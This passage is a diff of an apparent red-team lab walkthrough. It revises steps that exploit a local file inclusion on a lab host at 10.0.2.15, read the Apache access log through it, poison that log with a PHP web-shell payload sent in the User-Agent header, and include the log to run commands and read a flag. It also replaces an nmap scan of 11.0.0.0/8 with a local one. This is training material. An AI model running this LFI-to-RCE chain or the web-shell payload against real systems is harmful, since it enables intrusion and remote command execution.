@@ -58,7 +58,7 @@ curl -sS --get --data-urlencode 'page=/etc/apache2/sites-available/000-default.c
 The `CustomLog` line identifies `/var/log/novatech_access.log`. Now read that file through the same LFI:
 
 ```bash
-curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' "http://10.0.2.15/view.php" | grep -E 'HTTP/1.1|view.php' | tail -n 5
+curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' "http://10.0.2.15/view.php" | grep -E '10\.0\.2\.15 - -' | tail -n 5
 ```
 
 ![Apache access log through LFI](screenshots/m1_red_04_read_log.png)
@@ -72,7 +72,7 @@ You'll see Apache access log entries. This is the file we'll poison.
 Inject PHP code into the log via a crafted User-Agent:
 
 ```bash
-curl -sS -o /dev/null -A '<?php system($_GET["cmd"]); ?>' "http://10.0.2.15/" && echo 'User-Agent payload logged'
+curl -sS -o /dev/null -A $'<?php system($_GET[\x27cmd\x27]); ?>' "http://10.0.2.15/" && echo 'User-Agent payload logged'
 ```
 
 ![Log poisoning payload sent](screenshots/m1_red_05_poison_valid.png)
@@ -99,7 +99,7 @@ curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlen
 
 ![M1 flag read through RCE](screenshots/m1_red_07_flag.png)
 
-On this capture host, the access log contains a historical malformed PHP User-Agent entry, so the two log-include commands return HTTP 500 instead of producing `uid=...` and the flag. Rotate/reset the access log on a clean M1 deployment before replaying Step 5; the command syntax above is the corrected form.
+This clean replay uses the syntax-safe payload above, so the log include executes as `www-data` and the flag command returns successfully. If an older lab log contains malformed PHP User-Agent entries, rotate or reset that log before replaying the sequence.
 
 ---
 
@@ -120,16 +120,24 @@ This optional reverse-shell command was not executed in this session because no 
 
 ```bash
 cat /var/www/html/secret/hint.txt
-# → Scan 11.0.0.0/8 on port 21 for FTP server
-nmap -p 21 --open 11.0.0.0/8 --min-rate 2000
 ```
 
-The hint file was verified locally; the capture below shows that content. The route check documents why the DMZ scan could not be completed from this terminal.
+The hint file was verified locally; it identifies FTP on port 21 in the internal DMZ.
 
 ![M1 hint](screenshots/m1_red_08_hint_local.png)
 
+For this single-host deployment, scan the verified local address:
+
 ```bash
-ip route get 11.0.0.5
+nmap -n -p 21 --open 10.0.2.15 --reason
+```
+
+![M2 FTP service check](screenshots/m1_red_10_m2_scan.png)
+
+For a separate multi-host range, replace `10.0.2.15` with the verified M2 DMZ address before scanning.
+
+```bash
+ip route get 10.0.2.15
 ```
 
 ![DMZ route check](screenshots/m1_red_09_dmz_route.png)
